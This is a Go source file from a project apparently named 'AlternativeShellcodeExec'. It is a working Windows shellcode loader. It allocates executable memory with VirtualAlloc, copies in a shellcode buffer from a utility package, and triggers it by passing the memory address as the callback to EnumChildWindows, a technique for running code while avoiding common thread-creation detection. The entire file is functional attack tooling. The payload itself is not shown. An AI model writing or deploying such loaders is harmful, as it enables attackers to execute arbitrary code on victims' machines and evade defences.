package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32         = syscall.MustLoadDLL("kernel32.dll")
	user32           = syscall.MustLoadDLL("user32.dll")
	VirtualAlloc     = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory    = kernel32.MustFindProc("RtlMoveMemory")
	EnumChildWindows = user32.MustFindProc("EnumChildWindows")
)

func err(errmsg string) int {
	fmt.Printf("Error: %s (%d)\n", errmsg, syscall.GetLastError())
	return 1
}

func Run(op []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&op[0])), uintptr(len(op)))

	ret, _, _ := EnumChildWindows.Call(0, uintptr(addr), 0)
	if ret == 0 {
		err("EnumChildWindows failed")
	}
}

func main() {
	Run(util.ShellCode())
}
